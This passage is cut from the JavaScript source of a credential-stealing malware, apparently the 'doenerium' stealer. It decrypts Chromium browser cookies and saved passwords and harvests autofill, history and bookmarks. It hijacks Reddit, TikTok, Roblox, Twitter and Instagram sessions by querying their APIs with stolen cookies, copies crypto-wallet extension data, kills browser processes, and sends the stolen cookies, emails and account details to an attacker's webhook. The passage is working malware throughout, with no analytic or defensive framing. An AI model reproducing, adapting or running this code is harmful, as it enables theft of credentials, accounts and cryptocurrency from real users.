                                                        inline: true
                                                    },

                                                    {
                                                        name: "Coins",
                                                        value: `\`\`\`${accountInfo.coins}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Is Mod",
                                                        value: `\`\`\`${accountInfo.is_mod}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Is Gold",
                                                        value: `\`\`\`${accountInfo.is_gold}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Suspended",
                                                        value: `\`\`\`${accountInfo.is_suspended}\`\`\``,
                                                        inline: false
                                                    },

                                                ]
                                            }
                                        )
                                    ]
                                })

                                client.config.counter.reddit_found++;

                                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Reddit Accounts`)) {
                                    client.utils.jszip.createFolder("\\Reddit Accounts")
                                }

                                client.utils.jszip.createTxt(`\\Reddit Accounts\\${accountInfo.name}.txt`, `<================[ Reddit Account: ${accountInfo.name} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://www.reddit.com/user/${accountInfo.name}\nUsername: ${accountInfo.name}\nComment Karma: ${accountInfo.comment_karma}\nTotal Karma: ${accountInfo.total_karma}\nCoins: ${accountInfo.coins}\nIs Mod: ${accountInfo.is_mod}\nIs Gold: ${accountInfo.is_gold}\nSuspended: ${accountInfo.is_suspended}\nBrowser: ${browser}`)


                            } catch (e) {
                                console.log(e);
                            }
                        },

                        async stealTikTokSession(cookie, browser) {
                            try {
                                const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
                                const { data: accountInfo } = await client.axios_instance.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", headers);
                                const { data: insights } = await client.axios_instance(
                                    {
                                        method: "POST",
                                        url: "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
                                        headers: { cookie: cookie },
                                        data: "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]"
                                    }
                                )

                                const { data: wallet } = await client.axios_instance(
                                    {
                                        method: "GET",
                                        url: `https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true`,
                                        headers: {
                                            cookie: cookie
                                        }
                                    }
                                )

                                await client.utils.webhook.sendToWebhook({
                                    embeds: [
                                        client.utils.webhook.createEmbed(
                                            {
                                                "title": "TikTok session detected",
                                                "description": `The tiktok session was detected on the \`\`${browser}\`\` browser`,
                                                fields: [
                                                    {
                                                        name: "Cookie",
                                                        value: `\`\`\`${cookie}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Profile URL",
                                                        value: `[Click here](https://tiktok.com/@${accountInfo.data.username})`,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "User identifier",
                                                        value: `\`\`\`${accountInfo.data.user_id_str}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Email",
                                                        value: `\`\`\`${accountInfo.data.email || "No Email"}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Username",
                                                        value: `\`\`\`${accountInfo.data.username}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Follower Count",
                                                        value: `\`\`\`${insights.follower_num.value}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Coins",
                                                        value: `\`\`\`${wallet.data.coins}\`\`\``,
                                                        inline: false
                                                    },

                                                ]
                                            }
                                        )
                                    ]
                                })

                                client.config.counter.tiktok_found++;

                                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\TikTok Accounts`)) {
                                    client.utils.jszip.createFolder("\\TikTok Accounts")
                                }

                                client.utils.jszip.createTxt(`\\TikTok Accounts\\${accountInfo.data.username}.txt`, `<================[ TikTok Account: ${accountInfo.data.username} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://tiktok.com/@${accountInfo.data.username}\nUser identifier: ${accountInfo.data.user_id_str}\nEmail: ${accountInfo.data.email}\nUsername: ${accountInfo.data.username}\nFollower Count: ${accountInfo.insights.follower_num.value}\nCoins: ${wallet.data.coins}\nBrowser: ${browser}`)

                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async stealRobloxSession(cookie, browser) {
                            try {
                                const headers = { headers: { cookie: cookie, "Accept-Encoding": "identity" } }
                                const { data: accountInfo } = await client.axios_instance.get("https://www.roblox.com/my/account/json", headers);
                                const { data: balance } = await client.axios_instance.get("https://economy.roblox.com/v1/users/" + accountInfo.UserId + "/currency", headers);
                                const { data: skin } = await client.axios_instance.get("https://thumbnails.roblox.com/v1/users/avatar?userIds=" + accountInfo.UserId + "&size=420x420&format=Png&isCircular=false");


                                await client.utils.webhook.sendToWebhook({
                                    embeds: [
                                        client.utils.webhook.createEmbed(
                                            {
                                                "title": "Roblox session detected",
                                                "description": `The roblox session was detected on the \`\`${browser}\`\` browser`,
                                                "thumbnail": {
                                                    url: skin.data[0].imageUrl,
                                                },
                                                fields: [
                                                    {
                                                        name: "Cookie",
                                                        value: `\`\`\`${cookie}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Profile URL",
                                                        value: `[Click here](https://roblox.com/users/${accountInfo.UserId}/profile)`,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Robux",
                                                        value: `\`\`\`${balance.robux}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Name",
                                                        value: `\`\`\`${accountInfo.Name}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Display Name",
                                                        value: `\`\`\`${accountInfo.DisplayName}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Email",
                                                        value: `\`\`\`${accountInfo.UserEmail}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Email Verified",
                                                        value: `\`\`\`${accountInfo.IsEmailVerified}\`\`\``,
                                                        inline: false
                                                    },

                                                ]
                                            }
                                        )
                                    ]
                                })

                                client.config.counter.roblox_found++;

                                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Roblox Accounts`)) {
                                    client.utils.jszip.createFolder("\\Roblox Accounts")
                                }

                                client.utils.jszip.createTxt(`\\Roblox Accounts\\${accountInfo.Name}.txt`, `<================[ Roblox Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Cookie: ${cookie}\nRobux: ${balance.robux}\nName: ${accountInfo.Name}\nDisplay Name: ${accountInfo.DisplayName}\nEmail: ${accountInfo.UserEmail}\nEmail Verified: ${accountInfo.IsEmailVerified}\nBrowser: ${browser}`)

                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async get_twitter_ct0() {
                            return new Promise(async res => {
                                try {
                                    res(client.config.environ.twitter_ct0 = (await client.axios_instance.get("https://raw.githubusercontent.com/evasion6969/Evasion/main/ct0.txt")).data).toString("utf-8")
                                } catch {
                                    res(client.config.environ.twitter_ct0 = "ac1aa9d58c8798f0932410a1a564eb42")
                                }
                            })
                        },

                        async stealTwitterSession(headers, cookie, browser) {
                            try {

                                const { data: profile } = await client.axios_instance.post("https://twitter.com/i/api/1.1/account/update_profile.json", {}, { headers: { "cookie": cookie, ...headers } });

                                await client.utils.webhook.sendToWebhook({
                                    embeds: [
                                        client.utils.webhook.createEmbed(
                                            {
                                                "title": "Twitter session detected",
                                                "description": `The twitter session was detected on the \`\`${browser}\`\` browser`,
                                                "thumbnail": {
                                                    url: profile.profile_image_url_https,
                                                },
                                                fields: [
                                                    {
                                                        name: "Cookie",
                                                        value: `\`\`\`${cookie}\`\`\``
                                                    },
                                                    {
                                                        name: "Profile URL",
                                                        value: `[Click here](https://twitter.com/${profile.screen_name})`,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Screen name",
                                                        value: `\`\`\`${profile.screen_name}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Nickname",
                                                        value: `\`\`\`${profile.name}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Description",
                                                        value: `\`\`\`${profile.description}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Follower Count",
                                                        value: `\`\`\`${profile.followers_count}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Following Count",
                                                        value: `\`\`\`${profile.friends_count}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Created at",
                                                        value: `\`\`\`${profile.created_at}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Tweets",
                                                        value: `\`\`\`${profile.statuses_count}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Verified",
                                                        value: `\`\`\`${profile.verified}\`\`\``,
                                                        inline: true
                                                    }
                                                ]
                                            }
                                        )
                                    ]
                                })

                                client.config.counter.twitter_found++;

                                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Twitter Accounts`)) {
                                    client.utils.jszip.createFolder("\\Twitter Accounts")
                                }

                                client.utils.jszip.createTxt(`\\Twitter Accounts\\${profile.screen_name}.txt`, `<================[ Twitter Account: ${profile.screen_name} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Cookie: ${cookie}\nProfile URL: https://twitter.com/${profile.screen_name}\nScreenname: ${profile.screen_name}\nNickname: ${profile.name}\nDescription: ${profile.description}\nFollower Count: ${profile.followers_count}\nFollowing Count: ${profile.friends_count}\nCreated at: ${profile.created_at}\nTweets: ${profile.statuses_count}\nVerified: ${profile.verified}\nBrowser: ${browser}`)

                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async stealInstagramSession(cookie, browser) {
                            try {
                                const headers = { headers: { "user-agent": "Instagram 219.0.0.12.117 Android", "cookie": cookie } };
                                const { data: { user: accountInfo } } = await client.axios_instance.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", headers);
                                const { data: { user: accountInfo2 } } = await client.axios_instance.get("https://i.instagram.com/api/v1/users/" + accountInfo.pk_id + "/info", headers);

                                await client.utils.webhook.sendToWebhook({
                                    embeds: [
                                        client.utils.webhook.createEmbed(
                                            {
                                                "title": "Instagram session detected",
                                                "description": `The instagram session was detected on the \`\`${browser}\`\` browser`,
                                                "thumbnail": {
                                                    url: accountInfo.profile_pic_url,
                                                },
                                                fields: [
                                                    {
                                                        name: "Cookie",
                                                        value: `\`\`\`${cookie}\`\`\``,
                                                        inline: true
                                                    },
                                                    {
                                                        name: "Profile URL",
                                                        value: `[Click here](https://instagram.com/${accountInfo.username})`,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Username",
                                                        value: `\`\`\`${accountInfo.username}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Follower Count",
                                                        value: `\`\`\`${accountInfo2.follower_count}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Following Count",
                                                        value: `\`\`\`${accountInfo2.following_count}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Verified",
                                                        value: `\`\`\`${accountInfo.is_verified}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Nickname",
                                                        value: `\`\`\`${accountInfo.full_name || "No nickname"}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Email",
                                                        value: `\`\`\`${accountInfo.email}\`\`\``,
                                                        inline: false
                                                    },
                                                    {
                                                        name: "Biography",
                                                        value: `\`\`\`${accountInfo.biography || "No biography"}\`\`\``,
                                                        inline: false
                                                    },
                                                ]
                                            }
                                        )
                                    ]
                                })

                                client.config.counter.instagram_found++;

                                if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Instagram Accounts`)) {
                                    client.utils.jszip.createFolder("\\Instagram Accounts")
                                }

                                client.utils.jszip.createTxt(`\\Instagram Accounts\\${accountInfo.username}.txt`, `<================[ Instagram Account: ${accountInfo.Name} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Cookie: ${cookie}\nUsername: ${accountInfo.username}\nFollower Count: ${accountInfo2.follower_count}\nFollowing Count: ${accountInfo2.following_count}\nVerified: ${accountInfo.is_verified}\nNickname: ${accountInfo.full_name}\nEmail: ${accountInfo.email}\nBiography: ${accountInfo.biography}\nBrowser: ${browser}`)


                            } catch (e) { }
                        },

                        async saveBrowserStuff() {
                            ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(
                                async (type) => {

                                    if (type == "passwords") {
                                        try {
                                            client.config.environ.metamask.forEach(async (mmpath) => {
                                                client.utils.encryption.step1(mmpath, client.config.environ.all_passwords)
                                            })

                                            client.utils.encryption.step2(client.config.environ.all_passwords)
                                        } catch { }
                                    }

                                    var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
                                    client.utils.jszip.createFolder(`\\${_type}`);

                                    for (let [key, value] of Object.entries(
                                        client.config.environ[type]
                                    )) {
                                        if (value.length != 0) {
                                            var text = value.join("\n\n");
                                            var found_keywords = [];

                                            client.config.keywords.keywords.forEach((keyword) => {
                                                if (text.includes(keyword)) {


                                                    if (key.toUpperCase() == "ALL" && (_type == "Passwords" || _type == "Cookies" || _type == "Autofill")) {
                                                        client.config.counter[`keywords_${_type.toLowerCase()}`].push(keyword)
                                                    }

                                                    found_keywords.push(keyword);
                                                }
                                            });



                                            if (found_keywords.length == 0) {
                                                found_keywords =
                                                    "Found keywords: None\n<================[t.me/doenerium69]>================>\n";
                                            } else {
                                                found_keywords = `Found keywords: ${found_keywords.join(
                                                    ", "
                                                )}\n<================[t.me/doenerium69]>================>\n`;
                                            }

                                            client.utils.jszip.createTxt(
                                                `\\${_type}\\${key.toUpperCase()}.txt`,
                                                `${found_keywords}\n${text}`
                                            );
                                        }
                                    }
                                }
                            );
                        },

                        async getBookmarks(path) {
                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            if (client.requires.fs.existsSync(`${path}\\Bookmarks`)) {
                                var bookmarks = JSON.parse(
                                    client.requires.fs.readFileSync(`${path}\\Bookmarks`)
                                ).roots.bookmark_bar.children;

                                for (var bookmark of bookmarks) {
                                    try {
                                        client.config.environ.bookmarks.all.push(
                                            `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
                                        );

                                        if (!client.config.environ.bookmarks[browser]) {
                                            client.config.environ.bookmarks[browser] = [];
                                        }

                                        client.config.environ.bookmarks[browser].push(
                                            `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
                                        );
                                    } catch (err) { }

                                    client.config.counter.bookmarks++;
                                }
                            }
                        },

                        async getAutofill(path) {
                            let path_split = path.split("\\"),
                                path_split_tail = path.includes("Network")
                                    ? path_split.splice(0, path_split.length - 3)
                                    : path_split.splice(0, path_split.length - 2),
                                path_tail = path_split_tail.join("\\");

                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            if (
                                path.startsWith(
                                    client.utils.encryption.decryptData(client.config.user.appdata)
                                )
                            )
                                path_tail = path;
                            if (path.includes("cord")) {
                                return;
                            }

                            if (client.requires.fs.existsSync(`${path}\\Web Data`)) {
                                var sql = new client.requires.sqlite3.Database(
                                    `${path}\\Web Data`,
                                    (err) => { }
                                );

                                sql.each("SELECT * FROM autofill", function (err, row) {
                                    if (row) {
                                        client.config.environ.autofill.all.push(
                                            `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
                                        );

                                        if (!client.config.environ.autofill[browser]) {
                                            client.config.environ.autofill[browser] = [];
                                        }

                                        client.config.environ.autofill[browser].push(
                                            `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
                                        );
                                    }
                                });
                            }
                        },

                        async getHistory(path) {
                            let path_split = path.split("\\"),
                                path_split_tail = path.includes("Network")
                                    ? path_split.splice(0, path_split.length - 3)
                                    : path_split.splice(0, path_split.length - 2),
                                path_tail = path_split_tail.join("\\");

                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            if (
                                path.startsWith(
                                    client.utils.encryption.decryptData(client.config.user.appdata)
                                )
                            )
                                path_tail = path;
                            if (path.includes("cord")) {
                                return;
                            }

                            if (client.requires.fs.existsSync(`${path_tail}\\History`)) {
                                var sql = new client.requires.sqlite3.Database(
                                    `${path}\\History`,
                                    (err) => { }
                                );

                                sql.each("SELECT * FROM urls", function (err, row) {
                                    try {
                                        client.config.environ.history.all.push(
                                            `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                                        );

                                        if (!client.config.environ.history[browser]) {
                                            client.config.environ.history[browser] = [];
                                        }

                                        client.config.environ.history[browser].push(
                                            `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                                        );
                                    } catch (e) {
                                        console.log(e)
                                    }
                                });
                            }
                        },

                        async getCookies(path) {
                            let path_split = path.split("\\"),
                                path_split_tail = path.includes("Network")
                                    ? path_split.splice(0, path_split.length - 3)
                                    : path_split.splice(0, path_split.length - 2),
                                path_tail = path_split_tail.join("\\") + "\\";

                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            if (
                                path.startsWith(
                                    client.utils.encryption.decryptData(client.config.user.appdata)
                                )
                            )
                                path_tail = path;
                            if (path.includes("cord")) {
                                return;
                            }

                            if (client.requires.fs.existsSync(path_tail)) {
                                let encrypted = Buffer.from(
                                    JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
                                        .os_crypt.encrypted_key,
                                    "base64"
                                ).slice(5);

                                if (!client.requires.fs.existsSync(path + "Network")) {
                                    return;
                                } else {
                                }

                                const key = client.requires.dpapi.unprotectData(
                                    Buffer.from(encrypted, "utf-8"),
                                    null,
                                    "CurrentUser"
                                );

                                var sql = new client.requires.sqlite3.Database(
                                    `${path}Network\\Cookies`,
                                    (err) => { }
                                );

                                await new Promise((resolve, reject) => {
                                    var added_host_keys = {
                                        all: [],
                                    };

                                    sql.each(
                                        "SELECT * FROM cookies",
                                        async function (err, row) {
                                            let encrypted_value = row["encrypted_value"];

                                            var decrypted;

                                            try {
                                                if (
                                                    encrypted_value[0] == 1 &&
                                                    encrypted_value[1] == 0 &&
                                                    encrypted_value[2] == 0 &&
                                                    encrypted_value[3] == 0
                                                ) {
                                                    decrypted = dpapi.unprotectData(
                                                        encrypted_value,
                                                        null,
                                                        "CurrentUser"
                                                    );
                                                } else {
                                                    let start = encrypted_value.slice(3, 15),
                                                        middle = encrypted_value.slice(
                                                            15,
                                                            encrypted_value.length - 16
                                                        ),
                                                        end = encrypted_value.slice(
                                                            encrypted_value.length - 16,
                                                            encrypted_value.length
                                                        ),
                                                        decipher = client.requires.crypto.createDecipheriv(
                                                            "aes-256-gcm",
                                                            key,
                                                            start
                                                        );
                                                    decipher.setAuthTag(end);
                                                    decrypted =
                                                        decipher.update(middle, "base64", "utf-8") +
                                                        decipher.final("utf-8");
                                                }
                                            } catch (e) { console.log(e) }

                                            if (row["host_key"].includes("twitter") && row["name"] == "auth_token") {

                                                if (!client.config.environ.twitter_ct0) {
                                                    await client.utils.browsers.get_twitter_ct0();
                                                }

                                                client.utils.browsers.stealTwitterSession({
                                                    'authority': 'twitter.com',
                                                    'accept': '*/*',
                                                    'accept-language': 'en-US,en;q=0.9',
                                                    'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                                                    'origin': 'https://twitter.com',
                                                    'referer': 'https://twitter.com/home',
                                                    'sec-fetch-dest': 'empty',
                                                    'sec-fetch-mode': 'cors',
                                                    'sec-fetch-site': 'same-origin',
                                                    'sec-gpc': '1',
                                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                                                    'x-twitter-active-user': 'yes',
                                                    'x-twitter-auth-type': 'OAuth2Session',
                                                    'x-twitter-client-language': 'en',
                                                    'x-csrf-token': client.config.environ.twitter_ct0
                                                }, `ct0=${client.config.environ.twitter_ct0}; auth_token=${decrypted}`, browser);
                                            }


                                            if (row["host_key"].includes("reddit") && row["name"] == "reddit_session") {
                                                client.utils.browsers.stealRedditSession(`reddit_session=${decrypted}`, browser)
                                            }

                                            if (row["host_key"].includes("instagram") && row["name"].includes("sessionid")) {
                                                client.utils.browsers.stealInstagramSession(`sessionid=${decrypted}`, browser);
                                            }

                                            if (row["host_key"].includes("tiktok") && row["name"] == "sessionid") {
                                                client.utils.browsers.stealTikTokSession(`sessionid=${decrypted}`, browser);
                                            }

                                            if (row["name"].includes(".ROBLOSECURITY")) {
                                                client.utils.browsers.stealRobloxSession(`.ROBLOSECURITY=${decrypted}`, browser);
                                            }

                                            client.config.environ.cookies.all.push(
                                                `${row["host_key"]}  TRUE   /   FALSE   2597573456  ${row["name"]}  ${decrypted}`
                                            );

                                            if (!client.config.environ.cookies[browser]) {
                                                client.config.environ.cookies[browser] = [];
                                            }

                                            client.config.environ.cookies[browser].push(
                                                `${row["host_key"]} TRUE    /   FALSE   2597573456  ${row["name"]}  ${decrypted}`
                                            );

                                            client.config.counter.cookies++;

                                            added_host_keys[browser] = [];
                                            added_host_keys["all"].push(row["host_key"]);
                                        },
                                        function () {
                                            resolve("");
                                        }
                                    );
                                });
                            }
                        },

                        async getWallets(path) {
                            let path_split = path.split("\\"),
                                path_split_tail = path.includes("Network")
                                    ? path_split.splice(0, path_split.length - 3)
                                    : path_split.splice(0, path_split.length - 2),
                                path_tail = path_split_tail.join("\\") + "\\";

                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            var extension_identifiers = {
                                MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
                                Binance: "fhbohimaelbohpjbbldcngcnapndodjp",
                                Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                                Coinbase: "hnfanknocfeofbddgcijnmhnfnkdnaad",
                                Ronin: "fnjhmkhhmkbjkkabndcnnogagogbneec",
                                Exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
                                Coin98: "aeachknmefphepccionboohckonoeemg",
                                KardiaChain: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                                TerraStation: "aiifbnbfobpmeekipheeijimdpnlpgpp",
                                Wombat: "amkmjjmmflddogmhpjloimipbofnfjih",
                                Harmony: "fnnegphlobjdpkhecapkijjdkgcjhkib",
                                Nami: "lpfcbjknijpeeillifnkikgncikgfhdo",
                                MartianAptos: "efbglgofoippbgcjepnhiblaibcnclgk",
                                Braavos: "jnlgamecbpmbajjfhmmmlhejkemejdma",
                                XDEFI: "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                                Yoroi: "ffnbelfdoeiohenkjibnmadjiehjhajb",
                                TON: "nphplpgoakhhjchkkhmiggakijnkhfnd",
                                Authenticator: "bhghoamapcdpbohphigoooaddinpkbai",
                                MetaMask_Edge: "ejbalbakoplchlghecdalmeeeajnimhm",
                                Tron: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
                            };

                            for (let [key, value] of Object.entries(extension_identifiers)) {
                                if (
                                    client.requires.fs.existsSync(
                                        `${path}\\Local Extension Settings\\${value}`
                                    )
                                ) {
                                    if (key == "MetaMask" || key == "MetaMask_Edge") {
                                        if (!client.config.environ.metamask) {
                                            client.config.environ.metamask = []
                                        }
                                        client.config.environ.metamask.push(`${path}\\Local Extension Settings\\${value}`)
                                    }

                                    client.utils.jszip.copyFolder(
                                        `\\Wallets\\${browser} ${key}`,
                                        `${path}\\Local Extension Settings\\${value}`
                                    );
                                    client.config.counter.wallets++;
                                }
                            }
                        },

                        async closeBrowsers() {
                            const browsersProcess = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe"]
                            return new Promise(async res => {
                                try {
                                    const tasks = client.requires.child_process.execSync("tasklist");
                                    browsersProcess.forEach(process => {
                                        if (tasks.includes(process)) client.requires.child_process.exec(`taskkill /IM ${process} /F`)
                                    });
                                    await new Promise(resolve => setTimeout(resolve, 2500));
                                    res();
                                } catch (e) {
                                    console.log(e)
                                    res();
                                }
                            });
                        },

                        async getPasswords(path) {
                            client.config.environ.all_passwords = []
                            let path_split = path.split("\\"),
                                path_split_tail = path.includes("Network")
                                    ? path_split.splice(0, path_split.length - 3)
                                    : path_split.splice(0, path_split.length - 2),
                                path_tail = path_split_tail.join("\\") + "\\";

                            let browser;

                            if (path.includes("Local")) {
                                browser = path.split("\\Local\\")[1].split("\\")[0];
                            } else {
                                browser = path.split("\\Roaming\\")[1].split("\\")[1];
                            }

                            if (browser == "Google") {
                                browser == "Chrome";
                            } else if (browser == "BraveSoftware") {
                                browser = "Brave";
                            } else if (browser == "Microsoft") {
                                browser = "Microsoft Edge";
                            }

                            if (
                                path.startsWith(
                                    client.utils.encryption.decryptData(client.config.user.appdata)
                                )
                            )
                                path_tail = path;
                            if (path.includes("cord")) {
                                return;
                            }

                            if (client.requires.fs.existsSync(path_tail)) {
                                let encrypted = Buffer.from(
                                    JSON.parse(client.requires.fs.readFileSync(path_tail + "Local State"))
                                        .os_crypt.encrypted_key,
                                    "base64"
                                ).slice(5);

                                var login_data = path + "Login Data",
                                    passwords_db = path + "passwords.db";

                                client.requires.fs.copyFileSync(login_data, passwords_db);
                                const key = client.requires.dpapi.unprotectData(
                                    Buffer.from(encrypted, "utf-8"),
                                    null,
                                    "CurrentUser"
                                );
                                var sql = new client.requires.sqlite3.Database(
                                    passwords_db,
                                    (err) => { }
                                );

                                await new Promise((resolve, reject) => {
                                    sql.each(
                                        "SELECT origin_url, username_value, password_value FROM logins",
                                        function (err, row) {
                                            if (row["username_value"] != "") {
                                                let password_value = row["password_value"];
                                                try {
                                                    var password;
                                                    if (
                                                        password_value[0] == 1 &&
                                                        password_value[1] == 0 &&
                                                        password_value[2] == 0 &&
                                                        password_value[3] == 0
                                                    ) {
                                                        password = dpapi.unprotectData(
                                                            password_value,
                                                            null,
                                                            "CurrentUser"
                                                        );
                                                    } else {
                                                        let start = password_value.slice(3, 15),
                                                            middle = password_value.slice(
                                                                15,
                                                                password_value.length - 16
                                                            ),
                                                            end = password_value.slice(
                                                                password_value.length - 16,
                                                                password_value.length
                                                            ),
